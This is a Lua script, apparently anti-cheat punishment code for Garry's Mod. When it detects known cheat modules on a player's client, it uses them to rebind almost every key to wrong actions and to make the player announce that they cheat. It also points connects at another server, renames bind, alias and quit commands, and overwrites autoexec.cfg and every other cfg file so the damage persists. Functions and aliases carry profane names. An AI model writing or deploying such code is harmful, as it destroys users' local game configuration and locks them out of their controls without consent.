

local Modules = {
	["gmcl_oubhack_win32.dll"]	= {"OH_CPP_INTERFACE", "RunConsoleCommand"},
	["gmcl_frozen_win32.dll"]	= {"NHTable", "ClientCMD"},
	["gmcl_extras_win32.dll"]	= {"console", "Command"},
}

local _G	= _G
local Hide	= _E.gui.HideGameUI

local function EatKeys(bind,alias,host_writeconfig, func,fname)
	local function RCC(str)
		local ret,err = _H.pcall(function()
			func(str)
		end)
		if err then
			_H.DelayGMG("EatKeys=Err("..fname..") [".._H.tostring(err).."]")
		end
	end
	if fname == "cvar3" then RCC = function(s) _E.LocalPlayer():ConCommand(s) end end
	local function FuckKey(k,v) RCC(bind..' '..k..' "'..v..'; play hac/eight.wav; say I cheat ban me for"') end
	local function FuckYou(k,v) RCC(bind..' '..k..' "'..v..'"') end
	
	FuckYou("`", 			"play hac/still_not_working.mp3; gamemenucommand quitnoconfirm; say Whoops, I cheat!")
	FuckYou("F10", 			"play hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say Whoops, I hack!")
	FuckYou("MOUSE3",		"sensitivity 90; volume 0.1; say My hacks are awesome!")
	
	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("f", 			"noclip")
	FuckKey("q", 			"connect unitedhosts.org")
	FuckKey("c", 			"connect unitedhosts.org")
	FuckKey("v", 			"impulse 100")
	FuckKey("e", 			"+jump; +showscores")
	FuckKey("TAB", 			"+use")
	FuckKey("SPACE",		"+menu; host_writeconfig cfg/autoexec.cfg")
	FuckKey("MOUSE1",		"+attack2; sensitivity 90; volume 0.1;")
	FuckKey("MOUSE2",		"+attack; sensitivity 0.1; volume 1;")
	FuckKey("CTRL",			"kill")
	FuckKey("SHIFT",		"+walk")
	FuckKey("ALT",			"+speed")
	FuckKey("MWHEELUP",		"invnext")
	FuckKey("MWHEELDOWN",	"invprev")
	FuckKey("F4", 			"exec skill.cfg")
	FuckKey("F3", 			"exec skill.cfg")
	FuckKey("F2", 			"exec skill.cfg")
	FuckKey("F1", 			"exec skill.cfg")
	
	RCC(alias..' cancelselect "say I really should not cheat"')
	RCC(alias..' disconnect "say I will never cheat again!"')
	RCC(alias..' connect "say I cheat all the time!"')
	RCC(alias..' exit "say Ban me I cheat"')
	RCC(alias..' exec "say Wheres my hammer"')
	RCC(alias..' quit "say I should never have used hacks"')
	RCC(alias..' toggleconsole "say Whoops, I cheat!"')
	RCC(alias..' gamemenucommand "say Oh dear!"')
	RCC(alias..' host_writeconfig "echo Ban me if you can read this"')
	
	RCC("volume 0.1; ")
	
	_H.NotTS(1, function()
		RCC(host_writeconfig)
		for k,v in _H.pairs( _H.NotFF("cfg/*.cfg", "MOD") ) do
			RCC(host_writeconfig.." cfg/"..v)
		end
	end)
	
	_H.DelayGMG("EatKeys=YUMYUM")
end


local function NewRQ(k)
	local ret,err = _H.pcall(function()
		_H.NotRQ(k)
	end)
	if err then
		_H.DelayGMG("EatKeys=Modules("..k..") [".._H.tostring(err).."]")
		return false
	end
	return true
end


local Break = {
	"quit",
	"disconnect",
	"connect",
	"cancelselect",
	"exit",
	"toggleconsole",
}
local function EatModules()
	if _H.NotFE("lua/bin/gmcl_cvar3_win32.dll", "MOD") then
		if not NewRQ("cvar3") then return end
		
		if not (cvars.GetCommand and _H._R.ConVar.SetName) then
			_H.DelayGMG("EatKeys=Modules(cvar3) [GCC(".._H.tostring(cvars.GetCommand).."),SET(".._H.tostring(_H._R.ConVar.SetName)..")]")
			return
		end
		
		local Bind 			= cvars.GetCommand("bind")
		local Alias 		= cvars.GetCommand("alias")
		local Writeconfig	= cvars.GetCommand("host_writeconfig")
		
		if not (Bind and Alias and Writeconfig) then
			_H.DelayGMG("EatKeys=Modules(cvar3) [Bind=".._H.tostring(Bind)..",Alias=".._H.tostring(Alias)..",WC=".._H.tostring(Writeconfig).."]")
			return
		end
		Bind:SetName("fuck")
		Alias:SetName("shit")
		Writeconfig:SetName("cock")
		
		EatKeys("fuck","shit","cock", nil, "cvar3")
		
		_H.NotTC("EatKeys", 0.01, 0, Hide)
		
		for k,v in _H.pairs(Break) do
			local CVar	= cvars.GetCommand(v)
			
			if CVar then
				CVar:SetName("_~"..v)
			end
		end
		
		_H._R.ConVar.SetValue	= nil
		_H._R.ConVar.SetName	= nil
		_H._R.ConVar.SetFlags	= nil
		cvars.GetCommand 		= nil
	end
	
	
	for k,v in _H.pairs(Modules) do
		if not _H.NotFE("lua/bin/"..k, "MOD") then continue end
		
		k = k:gsub("gmcl_", "")
		k = k:gsub("_win32.dll", "")
		
		if NewRQ(k) then
			if v[2] then
				if _G[ v[1] ] and _G[ v[1] ][ v[2] ] then
					EatKeys("bind","alias","host_writeconfig", _G[ v[1] ][ v[2] ], v[1].."."..v[2])
				else
					_H.DelayGMG("EatKeys=Modules=No("..k..", "..v[1].."."..v[2]..")")
				end
			else
				if _G[ v[1] ] then
					EatKeys("bind","alias","host_writeconfig", _G[ v[1] ], v[1])
				else
					_H.DelayGMG("EatKeys=Modules=No("..k..", "..v[1]..")")
				end
			end
		end
	end
end
EatModules()

return "ERROR"














